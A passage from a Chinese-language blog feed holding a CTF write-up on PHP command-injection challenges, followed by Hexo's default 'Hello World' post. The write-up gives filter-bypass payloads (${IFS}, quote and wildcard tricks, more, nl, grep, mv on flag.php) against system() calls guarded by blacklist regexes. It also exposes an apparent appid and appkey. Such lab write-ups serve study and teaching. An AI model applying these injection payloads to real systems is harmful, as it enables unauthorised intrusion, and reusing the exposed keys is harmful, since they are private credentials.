&gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  preg_match 过滤了cat指令和;，cat指令可以用nl tac等等代替<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">https://6b67134c-<span class="hljs-number">1e91</span>-<span class="hljs-number">4b30</span>-8fc9-8fbd3c7680ed.challenge.ctf.<span class="hljs-built_in">show</span>/?c=more flag.php||<br></code></pre></td></tr></table></figure><h4 id="web-44-45-46-47-48-49"><a href="#web-44-45-46-47-48-49" class="headerlink" title="web 44 45 46 47 48 49"></a>web 44 45 46 47 48 49</h4><p>都千篇一律了 就是多了个正则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.绕过<span class="hljs-built_in">cat</span>使用：<br><br><span class="hljs-built_in">tac</span> more less <span class="hljs-built_in">head</span> <span class="hljs-built_in">tac</span> <span class="hljs-built_in">tail</span> <span class="hljs-built_in">nl</span> <span class="hljs-built_in">od</span>(二进制查看) vi vim <span class="hljs-built_in">sort</span> <span class="hljs-built_in">uniq</span> rev<br><br>2.绕过空格用：<br><br>%09 &lt;&gt;  &lt; <span class="hljs-variable">$&#123;IFS&#125;</span> $IFS$ &#123;<span class="hljs-built_in">cat</span>,fl*&#125; %20<br><br>注：<br><br>%09  <span class="hljs-comment">##（Tab） %20 ##（space）</span><br><br>3.对flag的过滤（这里也就几个，索性就全丢出来了）<br><br>1.‘’    （例如fl‘’ag）<br><br>2.“”     （例如fl<span class="hljs-string">&quot;&quot;</span>ag)<br><br>3.?       (例如fl??)<br><br>4.*          (例如fl*）<br></code></pre></td></tr></table></figure><h4 id="web-50-51-52-53"><a href="#web-50-51-52-53" class="headerlink" title="web 50 51 52 53"></a>web 50 51 52 53</h4><p>\x09与\x26的含义其实就是%09（tab键）和%26（&amp;）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>依旧用前边的?c&#x3D;nl&lt;&gt;f’’lag.php||</p><h4 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>基本上都被过滤</p><p>像这种可以选择使用之前讲过的一种用?通配符来构造的方式，如：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby">对flag.php的构造可以这样：fl?<span class="hljs-string">?.</span><span class="hljs-string">??</span>?<br>甚至可以简化为：<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br><br>同样，命令也可以进行构造<br>cat可以构造为<span class="hljs-string">?a</span>t、c??<br><br><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/c</span>?<span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">IFS</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br>可以理解为当前目录运行cat命令实际上运行的也是bin/cat，而通配符不会帮你去找到bin下面的cat<br>只会在当前目录寻找能通配的文件,所以用通配符运行时必须给出路径<br>另外grep命令可以才文件中查找含有的字符串<br>形式：grep [字符串] [filename]<br><span class="hljs-string">?c</span>=grep<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;ctfshow<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br></code></pre></td></tr></table></figure><p>题重命名文件</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=mv<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl?<span class="hljs-string">?.</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">IFS</span>&#125;a.txt<br>把flag.php重命名为了a.txt<br>然后直接访问a.txt就行<br></code></pre></td></tr></table></figure><p>YN1sQMDWazi9Buy9qgADOzNw-gzGzoHsz appid</p><p>olnaSjkw5coJGw2mGcaklLF5   appkey</p><p><img src="C:\Users\13061\AppData\Roaming\Typora\typora-user-images\image-20241024203304759.png" alt="image-20241024203304759"></p><p><img src="C:\Users\13061\AppData\Roaming\Typora\typora-user-images\image-20241024210034799.png" alt="image-20241024210034799"></p><p># Deployment</p><p>## Docs: <a href="https://hexo.io/docs/one-command-deployment">https://hexo.io/docs/one-command-deployment</a></p><p>deploy:</p><p> type: ‘’</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/10/24/hello-world/"/>
    <url>/2024/10/24/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
